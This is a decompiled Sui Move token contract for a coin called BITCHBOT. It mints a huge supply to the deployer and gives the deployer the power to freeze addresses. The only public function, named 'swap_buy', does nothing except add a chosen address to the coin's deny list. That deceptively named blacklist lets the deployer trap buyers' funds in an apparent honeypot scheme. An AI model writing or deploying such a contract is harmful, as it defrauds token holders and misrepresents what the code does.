module 0xfb7a1392aaa468df1ad8c653df6fb01f327a0063c6ce8ad150b25b94cda1fe20::bitchbot {
    struct BITCHBOT has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: BITCHBOT, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<BITCHBOT>(arg0, 9, b"BITCHBOT", b"BITCHBOT", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://gateway.irys.xyz/JUq6-wAVfiaPm1pX2sKZLpGbM_WDLq_HTMn_y6UAnsI"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<BITCHBOT>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<BITCHBOT>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<BITCHBOT>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<BITCHBOT>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BITCHBOT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<BITCHBOT>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

